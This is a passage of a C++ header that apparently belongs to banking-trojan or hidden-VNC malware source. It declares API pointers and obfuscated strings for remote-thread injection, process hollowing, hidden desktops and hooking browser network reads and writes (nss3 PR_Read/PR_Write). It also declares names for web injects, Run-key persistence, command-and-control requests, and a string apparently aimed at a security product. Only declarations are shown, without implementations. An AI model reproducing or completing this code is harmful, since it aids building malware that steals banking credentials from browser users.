   extern Types::T_GetMenuItemID                  pGetMenuItemID;
   extern Types::T_MenuItemFromPoint              pMenuItemFromPoint;
   extern Types::T_RealGetWindowClass             pRealGetWindowClassA;
   extern Types::T_PtInRect                       pPtInRect;
   extern Types::T_GetWindowPlacement             pGetWindowPlacement;
   extern Types::T_SetWindowLong                  pSetWindowLongA;
   extern Types::T_GetWindowLong                  pGetWindowLongA;
   extern Types::T_WindowFromPoint                pWindowFromPoint;
   extern Types::T_SHAppBarMessage                pSHAppBarMessage;
   extern Types::T_RegQueryValueEx                pRegQueryValueExA;
   extern Types::T_GetDesktopWindow               pGetDesktopWindow;
   extern Types::T_DeleteDC                       pDeleteDC;
   extern Types::T_ReleaseDC                      pReleaseDC;
   extern Types::T_DeleteObject                   pDeleteObject;
   extern Types::T_GetDIBits                      pGetDIBits;
   extern Types::T_StretchBlt                     pStretchBlt;
   extern Types::T_SetStretchBltMode              pSetStretchBltMode;
   extern Types::T_SelectObject                   pSelectObject;
   extern Types::T_CreateCompatibleDC             pCreateCompatibleDC;
   extern Types::T_CreateCompatibleBitmap         pCreateCompatibleBitmap;
   extern Types::T_GetDC                          pGetDC;
   extern Types::T_IsWindowVisible                pIsWindowVisible;
   extern Types::T_GetWindow                      pGetWindow;
   extern Types::T_BitBlt                         pBitBlt;
   extern Types::T_PrintWindow                    pPrintWindow;
   extern Types::T_GetTopWindow                   pGetTopWindow;
   extern Types::T_NtUnmapViewOfSection           pNtUnmapViewOfSection;
   extern Types::T_NtQueryInformationProcess      pNtQueryInformationProcess;
   extern Types::T_GetThreadContext               pGetThreadContext;
   extern Types::T_SetThreadContext               pSetThreadContext;
   extern Types::T_SHFileOperation                pSHFileOperationA;
   extern Types::T_FindFirstFile                  pFindFirstFileA;
   extern Types::T_FindNextFile                   pFindNextFileA;
}

namespace Strs
{
   extern const char *host[];
   extern const char *path;
   extern const char *user32;
   extern const char *kernel32;
   extern const char *kernelBase;
   extern const char *msvcrt;
   extern const char *ntdll;
   extern const char *shlwapi;
   extern const char *shell32;
   extern const char *secur32;
   extern const char *advapi32;
   extern const char *ws2_32;
   extern const char *version;
   extern const char *psapi;
   extern const char *wininet;
   extern const char *gdi32;

   extern wchar_t *wKernelBase;
   extern wchar_t *wKernel32;
   extern wchar_t *wNtdll;
   extern wchar_t *wWininet;

   extern const char *wideCharToMultiByte;
   extern const char *messageBoxA;
   extern const char *getWindowsDirectoryA;
   extern const char *localAlloc;
   extern const char *wsprintfA;
   extern const char *multiByteToWideChar;
   extern const char *malloc;
   extern const char *free;
   extern const char *virtualAllocEx;
   extern const char *writeProcessMemory;
   extern const char *createRemoteThread;
   extern const char *loadLibraryA;
   extern const char *getProcAddress;
   extern const char *pathRemoveFileSpecA;
   extern const char *getModuleFileNameA;
   extern const char *pathFindFileNameA;
   extern const char *strncmp;
   extern const char *strnicmp;
   extern const char *lstrlenA;
   extern const char *exitProcess;
   extern const char *shGetFolderPathA;
   extern const char *lstrcpyA;
   extern const char *lstrcatA;
   extern const char *copyFileA;
   extern const char *getVolumeInformationA;
   extern const char *getUserNameExA;
   extern const char *lookupAccountNameA;
   extern const char *convertSidToStringSidA;
   extern const char *localFree;
   extern const char *memcpy;
   extern const char *lstrcmpiA;
   extern const char *lstrcmpA;
   extern const char *strStrA;
   extern const char *strStrIA;
   extern const char *strtol;
   extern const char *realloc; 
   extern const char *wsaStartup;
   extern const char *socket;
   extern const char *gethostbyname;
   extern const char *htons;
   extern const char *connect;
   extern const char *send;
   extern const char *recv;
   extern const char *closesocket;
   extern const char *wsaCleanup;
   extern const char *memset;
   extern const char *sleep;
   extern const char *ntOpenKey;
   extern const char *closeHandle;
   extern const char *ntSetValueKey;
   extern const char *createProcessA;
   extern const char *enterCriticalSection;
   extern const char *leaveCriticalSection;
   extern const char *initializeCriticalSection;
   extern const char *getLastError;
   extern const char *_errNo;
   extern const char *strTol;
   extern const char *toLower;
   extern const char *isDigit;
   extern const char *strToul;
   extern const char *isXdigit;
   extern const char *strTod;
   extern const char *createToolhelp32Snapshot;
   extern const char *process32First;
   extern const char *process32Next;
   extern const char *strChrA;
   extern const char *strToIntA;
   extern const char *getModuleHandleA;
   extern const char *getFileVersionInfoSizeA;
   extern const char *getFileVersionInfoA;
   extern const char *verQueryValueA;
   extern const char *getModuleInformation;
   extern const char *memcmp;
   extern const char *expandEnvironmentStringsA;
   extern const char *getPrivateProfileSectionNamesA;
   extern const char *getPrivateProfileStringA;
   extern const char *createFileA;
   extern const char *readFile;
   extern const char *writeFile;
   extern const char *regSetValueExA;
   extern const char *regOpenKeyExA;
   extern const char *regCloseKey;
   extern const char *getFileSize;
   extern const char *resumeThread;
   extern const char *isWow64Process;
   extern const char *getNativeSystemInfo;
   extern const char *openProcess;
   extern const char *createThread;
   extern const char *getUserNameW;
   extern const char *getComputerNameW;
   extern const char *getVersionExA;
   extern const char *createNamedPipeA;
   extern const char *connectNamedPipe;
   extern const char *disconnectNamedPipe;
   extern const char *internetCrackUrlA;
   extern const char *getTempPathA;
   extern const char *getTempFileNameA;
   extern const char *shellExecuteA;
   extern const char *ioctlsocket;
   extern const char *ntohs;
   extern const char *createMutexA;
   extern const char *releaseMutex;
   extern const char *ntCreateThreadEx;
   extern const char *terminateProcess;
   extern const char *findWindowA;
   extern const char *getWindowThreadProcessId;
   extern const char *waitForSingleObject;
   extern const char *enumWindows;
   extern const char *getCurrentProcessId;
   extern const char *deleteFileA;
   extern const char *pathFileExistsA;
   extern const char *createDirectoryA;
   extern const char *httpQueryInfoA;
   extern const char *httpQueryInfoW;
   extern const char *rtlCompressBuffer;
   extern const char *rtlGetCompressionWorkSpaceSize;
   extern const char *setThreadDesktop;
   extern const char *createDesktopA;
   extern const char *openDesktopA;
   extern const char *terminateThread;
   extern const char *postMessageA;
   extern const char *sendMessageA;
   extern const char *childWindowFromPoint;
   extern const char *screenToClient;
   extern const char *moveWindow;
   extern const char *getWindowRect;
   extern const char *getMenuItemID;
   extern const char *menuItemFromPoint;
   extern const char *realGetWindowClassA;
   extern const char *ptInRect;
   extern const char *getWindowPlacement;
   extern const char *setWindowLongA;
   extern const char *getWindowLongA;
   extern const char *windowFromPoint;
   extern const char *shAppBarMessage;
   extern const char *regQueryValueExA;
   extern const char *getDesktopWindow;
   extern const char *deleteDc;
   extern const char *releaseDc;
   extern const char *deleteObject;
   extern const char *getDiBits;
   extern const char *stretchBlt;
   extern const char *setStretchBltMode;
   extern const char *selectObject;
   extern const char *createCompatibleDc;
   extern const char *createCompatibleBitmap;
   extern const char *getDc;
   extern const char *isWindowVisible;
   extern const char *getWindow;
   extern const char *bitBlt;
   extern const char *printWindow;
   extern const char *getTopWindow;
   extern const char *ntUnmapViewOfSection;
   extern const char *ntQueryInformationProcess;
   extern const char *getThreadContext;
   extern const char *setThreadContext;
   extern const char *shFileOperationA;
   extern const char *findFirstFileA;
   extern const char *findNextFileA;

   extern const char *rtlInitAnsiString;           
   extern const char *rtlAnsiStringToUnicodeString;     
   extern const char *ldrLoadDll;
   extern const char *ldrGetProcedureAddress;
   extern const char *rtlFreeUnicodeString;
   extern const char *rtlCreateUserThread;

   extern const char *helloWorld;
   extern const char *exeExt;
   extern const char *fileDiv;
   extern const char *postSpace;
   extern const char *getSpace;
   extern const char *httpReq1;
   extern const char *httpReq2;
   extern const char *httpReq3;
   extern const char *httpReq4;
   extern const char *httpReq5;
   extern const char *httpReq6;
   extern const char *httpReq7;
   extern const char *httpReq8;
   extern const char *httpReq9;
   extern const char *sprintfIntEscape;
   extern const char *winNewLine;
   extern const char *ntRegPath;
   extern const char *userRunKey;
   extern const char *dllhostExe;
   extern const char *pingRequest;
   extern const char *dll32binRequest;
   extern const char *dll64binRequest;
   extern const char *explorerExe;
   extern const char *firefoxExe;
   extern const char *chromeExe;
   extern const char *edgeExe;
   extern const char *braveExe;
   extern const char *iexploreExe;
   extern const char *powershell;
   extern const char *injectsRequest;
   extern const char *chromeName;
   extern const char *firefoxName;
   extern const char *ieName;
   extern const char *chromeDll;
   extern const char *nss3dll;
   extern const char *nspr4dll;
   extern const char *prRead;
   extern const char *prWrite;
   extern const char *rdata;
   extern const char *fc1;
   extern const char *fc2;
   extern const char *fc3;
   extern const char *fc4;
   extern const char *fc5;
   extern const char *fc6;
   extern const char *fc7;
   extern const char *fc8;
   extern const char *fc9;
   extern const char *fc10;
   extern const char *fc11;
   extern const char *fc12;
   extern const char *headersEnd;
   extern const char *bu1;
   extern const char *bu2;
   extern const char *bu3;
   extern const char *bu4;
   extern const char *bu5;
   extern const char *ie1;
   extern const char *ie2;
   extern const char *ie3;
   extern const char *ie4;
   extern const char *ie5;
   extern const char *ie6;
   extern const char *ie7;
   extern const char *ie8;
   extern const char *ie9;
   extern const char *ie10;
   extern const char *ie11;
   extern const char *exp1;
   extern const char *exp2;
   extern const char *exp3;
   extern const char *exp4;
   extern const char *exp5;
   extern const char *exp6;
   extern const char *exp7;
   extern const char *exp8;
   extern const char *exp9;
   extern const char *exp10;
   extern const char *exp11;
   extern const char *exp12;
   extern const char *exp13;
   extern const char *exp14;
   extern const char *exp15;
   extern const char *exp16;
   extern const char *exp17;
   extern const char *exp18;
   extern const char *exp19;
   extern const char *exp20;
   extern const char *exp21;
   extern const char *exp22;
   extern const char *exp23;
   extern const char *exp24;
   extern const char *exp25;
   extern const char *hd1;
   extern const char *hd2;
   extern const char *hd3;
   extern const char *hd4;
   extern const char *hd5;
   extern const char *hd6;
   extern const char *hd7;
   extern const char *hd8;
   extern const char *hd9;
   extern const char *hd10;
   extern const char *hd11;
   extern const char *hd12;
   extern const char *hd13;
   extern const char *hd14;
   extern const char *hd15;
   extern const char *infoRequest;
   extern const char *pipeName;
   extern const char *open;
   extern const char *hi;
   extern const char *shell_TrayWnd;
   extern const char *verclsidExe;
   extern const char *dll32cachePrefix;
   extern const char *dll64cachePrefix;
   extern const char *loaderDllName;
   extern const char *zoneId;
   extern const char *trusteer;

   extern wchar_t *wNss3dll;
   extern wchar_t *wNspr4dll;
}

void InitApi();